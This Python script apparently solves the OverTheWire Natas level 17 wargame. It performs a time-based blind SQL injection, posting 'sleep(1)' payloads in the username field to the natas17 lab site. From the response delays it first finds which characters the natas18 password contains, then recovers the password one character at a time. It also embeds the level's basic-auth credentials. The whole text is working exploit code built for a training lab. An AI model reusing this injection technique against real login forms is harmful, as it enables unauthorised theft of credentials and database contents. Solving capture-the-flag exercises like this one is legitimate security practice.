#!/bin/python3
# Description: Script to retrieve natas18 password from the DB

import requests
from requests.auth import HTTPBasicAuth

# Initialize variables
Auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
headers = {'content-type': 'application/x-www-form-urlencoded'}
passchars = ''
passwd = ''
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

# find chars in the password
for char in chars:
    payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',
            auth=Auth, data=payload, headers=headers)
    if(r.elapsed.seconds >= 1):
        passchars += char
        print(passchars)

for i in range(0, 32):
    for char in passchars:
        payload = 'username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(1)%23'.format(passwd + char)
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php'
                ,auth=Auth, data=payload, headers=headers)
        if(r.elapsed.seconds >= 1):
            passwd += char
            print(passwd)
            break
